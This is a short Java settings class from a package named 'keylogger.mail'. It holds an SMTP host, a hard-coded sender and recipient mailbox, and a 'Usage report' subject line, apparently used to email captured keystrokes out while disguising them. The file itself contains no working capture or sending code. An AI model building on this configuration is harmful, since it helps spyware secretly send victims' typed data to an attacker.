package com.mossad.keylogger.mail;

import java.util.Properties;

public final class Settings {

    final static String MAIL_HOST_NAME = "smtp.wp.pl";
    final static String from = "kisonar@wp.pl";
    final static String to = from;
    final static String subject = "Usage report ";
    final static String bodyText = "Usage report from....";

    private Settings(){

    }

    public static Properties getSettings(){
        Properties properties = new Properties();

        return properties;
    }


}
